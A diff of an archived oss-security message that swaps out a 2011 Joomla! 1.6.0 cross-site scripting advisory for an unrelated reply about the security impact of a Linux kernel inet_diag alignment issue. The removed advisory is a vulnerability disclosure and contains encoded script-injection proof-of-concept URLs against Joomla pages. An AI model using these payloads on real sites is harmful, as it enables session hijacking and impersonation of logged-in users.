@@ -1,131 +1,23 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/13/8
-Message-ID: <AANLkTi=gr8Onan0_bTwr-kjC5eT1KpxbtjjRvi=3-tJf@mail.gmail.com>
-Date: Mon, 14 Mar 2011 01:46:43 +0800
-From: YGN Ethical Hacker Group <lists@...g.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/20/16
+Message-ID: <BANLkTimxm84Qm+31Hab7QwLhrVEurkKQNA@mail.gmail.com>
+Date: Mon, 20 Jun 2011 15:16:52 -0400
+From: Dan Rosenberg <dan.j.rosenberg@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request: Joomla! 1.6.0 | Cross Site Scripting (XSS) Vulnerability
+Cc: "Steven M. Christey" <coley@...us.mitre.org>
+Subject: Re: CVE request: kernel: inet_diag: fix inet_diag_bc_audit()
 Content-Type: text/plain; charset=utf-8
 
-==========================================
- Joomla! 1.6.0 | Cross Site Scripting (XSS) Vulnerability
-==========================================
+>> Also make sure each instruction is aligned on 4 bytes boundary, to avoid
+>> unaligned accesses.
+>
+> Should this get a seperate ID?
+>
 
+AFAIK, on some architectures, unaligned accesses will generate a
+fault, which will be handled by emulating the access via byte-size
+loads and stores (for example).  So while unaligned accesses like this
+should be avoided, I don't think there's a security impact.  Anyone
+who knows better, please correct me if I'm wrong.
 
-1. OVERVIEW
-
-Joomla! 1.6.0 was vulnerable to Cross Site Scripting.
-
-
-2. PRODUCT DESCRIPTION
-
-Joomla is a free and open source content management system (CMS) for
-publishing content on the World Wide Web and intranets. It comprises a
-model–view–controller (MVC) Web application framework that can also be
-used independently.
-Joomla is written in PHP, uses object-oriented programming (OOP)
-techniques and software design patterns, stores data in a MySQL
-database, and includes features such as page caching, RSS feeds,
-printable versions of pages, news flashes, blogs, polls, search, and
-support for language internationalization.
-
-
-3. VULNERABILITY DESCRIPTION
-
-The Query String parameter was not properly sanitized upon submission
-to the /index.php url, which allows attacker to conduct Cross Site
-Scripting attack. This may allow an attacker to create a specially
-crafted URL that would execute arbitrary script code in a victim's
-browser.
-
-
-4. VERSION AFFECTED
-
-Joomla! 1.6.0
-
-
-5. PROOF-OF-CONCEPT/EXPLOIT
-
->>> SEO-enabled Joomla 1.6.0
-
-http://attacker.in/joomla160/index.php/%2522%253E%253Cimg%2520src%253Da%2520onerror%253Dalert(String.fromCharCode(88,83,83))%253E09739572178%252F
-
-http://attacker.in/joomla160/index.php/using-joomla/extensions/components/search-component/search/'%2522%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E
-
-http://attacker.in/joomla160/index.php/contact-us/'%2522%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E
-
-http://attacker.in/joomla160/index.php/park-links?'%2522%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E=1
-
-http://attacker.in/joomla160/index.php/using-joomla/extensions/templates?'%2522%253E%253Cscript%253Ealert(%252FXSS%252F)%253C%252Fscript%253E=1
-
-
->>> SEO-disabled Joomla 1.6.0
-
-http://attacker.in/joomla160x/index.php?option=com_weblinks&view=category&id=18&Itemid=227&a86a9%2522%253e%253cscript%253ealert%25281%2529%253c%252fscript%253e9666d64388c=1
-
-http://attacker.in/joomla160x/index.php?option=com_content&view=category&layout=blog&id=21&Itemid=268&%2522%253e%253cscript%253ealert%280%29%253c/script%253e=XSS
-
-
-This is the exactly same variant as shown in our last year demo video
-in 1.5.20:
-
-http://yehg.net/lab/pr0js/training/view/misc/joomla-1.5.20_encoded-xss/
-
-We thought Joomla! team would fix this issue in 1.6.0 stable release
-whilst they fixed it in Joomla! 1.5.21!
-
-
-6. IMPACT
-
-Attackers can compromise currently logged-in user/administrator
-session and impersonate arbitrary user actions available under
-/administrator/ functions.
-
-
-7. SOLUTION
-
-Upgrade to Joomla! 1.6.1 or higher
-
-
-8. VENDOR
-
-Joomla! Developer Team
-http://www.joomla.org
-
-
-9. CREDIT
-
-This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
-Ethical Hacker Group, Myanmar.
-
-
-10. DISCLOSURE TIME-LINE
-
-2011-01-24: notified vendor
-2011-03-08: vendor released fix
-2011-03-14: vulnerability disclosed
-
-
-11. REFERENCES
-
-Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.6.0]_cross_site_scripting(XSS)
-Former Advisory URL:
-http://yehg.net/lab/pr0js/advisories/joomla/core/[joomla_1.5.20]_cross_site_scripting(XSS)
-XSS FAQ: http://www.cgisecurity.com/xss-faq.html
-OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
-CWE-79: http://cwe.mitre.org/data/definitions/79.html
-
-
-#yehg [2011-03-14]
-
-
-
-
----------------------------------
-Best regards,
-YGN Ethical Hacker Group
-Yangon, Myanmar
-http://yehg.net
-Our Lab | http://yehg.net/lab
-Our Directory | http://yehg.net/hwd
+-Dan
